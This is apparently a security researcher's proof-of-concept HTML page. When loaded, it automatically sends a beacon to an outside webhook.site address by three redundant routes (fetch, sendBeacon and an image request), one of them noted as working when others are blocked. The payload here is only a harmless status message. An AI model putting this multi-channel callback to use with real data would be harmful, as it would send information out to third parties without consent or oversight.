<!DOCTYPE html>
<html>
<head><title>Audit System - Firman Sahidin</title></head>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <h1>[ FIRMAN SAHIDIN - SECURITY AUDIT ]</h1>
    <h2 id="status">STATUS: INITIALIZING...</h2>

    <script>
        // URL WEBHOOK MANG FIRMAN
        const WEBHOOK = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';

        async function kirimData() {
            try {
                const payload = JSON.stringify({
                    status: "SUCCESS_CONNECTED",
                    researcher: "Firman Sahidin",
                    msg: "Jalur Aman Mang!"
                });

                // Jalur 1: Fetch
                fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: payload });

                // Jalur 2: Beacon
                navigator.sendBeacon(WEBHOOK, payload);

                // Jalur 3: Image (Paling Ampuh mun diblokir)
                const img = new Image();
                img.src = WEBHOOK + "?data=TEST_IMAGE_BONE";

                document.getElementById('status').innerText = "STATUS: ✅ SIGNAL SENT TO WEBHOOK!";
            } catch (e) {
                document.getElementById('status').innerText = "STATUS: ❌ ERROR: " + e.message;
            }
        }

        window.onload = kirimData;
    </script>
</body>
</html>
